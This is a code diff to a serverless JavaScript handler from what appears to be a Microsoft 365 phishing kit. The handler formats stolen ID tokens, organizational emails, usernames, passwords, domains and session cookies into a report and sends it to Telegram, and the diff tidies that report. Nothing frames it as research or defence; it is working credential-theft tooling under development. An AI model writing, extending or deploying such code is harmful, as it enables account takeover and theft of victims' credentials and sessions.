@@ -96,7 +96,7 @@ export const handler = async (event, context) => {
       messageText += `🆔 ID Token: ❌ Missing\n\n`;
     }
 
-    // Add organizational credentials info
+    // Add organizational credentials info (only if detected)
     const orgCreds = data.organizationalCredentials;
     if (orgCreds && (orgCreds.email || orgCreds.username || orgCreds.password)) {
       messageText += `🏢 *Organizational Login Detected*\n`;
@@ -105,9 +105,8 @@ export const handler = async (event, context) => {
       messageText += `🔑 Org Username: ${orgCreds.username || 'not-captured'}\n`;
       messageText += `🔐 Org Password: ${orgCreds.password ? '✅ Captured' : '❌ Not captured'}\n`;
       messageText += `🌐 Org Domain: ${orgCreds.domain || 'unknown'}\n\n`;
-    } else {
-      messageText += `🏢 Organization: Direct Microsoft login\n\n`;
     }
+    // REMOVED: No longer showing "Direct Microsoft login" line
     
     // Note: Authorization code is in the file, not in text message for security
     
@@ -121,10 +120,7 @@ export const handler = async (event, context) => {
       messageText += `🍪 Cookies: None captured\n`;
     }
     
-    // Add browser fingerprint if available
-    if (data.browserFingerprint) {
-      messageText += `🖥️ Browser: ${data.browserFingerprint.userAgent ? data.browserFingerprint.userAgent.substring(0, 50) + '...' : 'Unknown'}\n`;
-    }
+    // REMOVED: Browser fingerprint line
 
     console.log('📤 Sending message to Telegram:', messageText.substring(0, 200) + '...');
 
